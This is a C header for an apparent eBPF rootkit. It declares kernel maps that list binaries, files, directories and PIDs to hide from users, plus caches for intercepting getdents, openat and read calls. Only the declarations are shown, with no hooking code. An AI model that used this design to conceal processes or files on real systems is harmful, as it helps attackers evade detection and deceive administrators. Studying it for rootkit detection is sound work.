/**
 * Contains all map declaration for the eBPF module.
 * 
 * NOTE => maps name must be max 16 bytes long.
 * 
 * @author Yekuuun
 */

#ifndef BPF_MAPS_H
#define BPF_MAPS_H

#include "bpf_config.h"

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  CONFIGURABLE CACHES
// └────────────────────────────────────┘
//----------------------------------------------------

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_BINARIES_CONFIG_CACHE);
    __type(key, char[DNAME_MAX]);
    __type(value, __u8); // 1 == active
} hide_cache_bin SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_BINARIES_CONFIG_CACHE);
    __type(key, char[DNAME_MAX]);
    __type(value, __u8); // 1 == active
} hide_cache_file SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_BINARIES_CONFIG_CACHE);
    __type(key, char[DNAME_MAX]);
    __type(value, __u8); // 1 == active
} hide_cache_dir SEC(".maps");

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  HIDE PROCESS
// └────────────────────────────────────┘
//----------------------------------------------------

/**
 * PID watch list.
 * 
 * @note => contains all pid to hide from user.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_PID_ENTRIES);
    __type(key,   __u32);
    __type(value, __u8); // 1 == hidden. 
} hide_pid_cache SEC(".maps");

//---------------------------------------------------------------

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  TMP CACHES
// └────────────────────────────────────┘
//----------------------------------------------------

//getdents handling.
struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 1028);
    __type(key, __u64);  //pid_tgid as key.
    __type(value, __u64);
} getdents_cache SEC(".maps");

//openat & read handling.
struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 4096);
    __type(key, __u64);  // pid_tgid complet (unique par thread en vol)
    __type(value, char[MAX_PATH]);
} openat_cache SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 4096);
    __type(key, __u64);   // pid_tgid complet (unique par thread en vol)
    __type(value, __u64); //fd
} read_cache SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 1028);
    __type(key, struct fd_key);
    __type(value, char[MAX_PATH]);
} fd_to_path_cache SEC(".maps");

#endif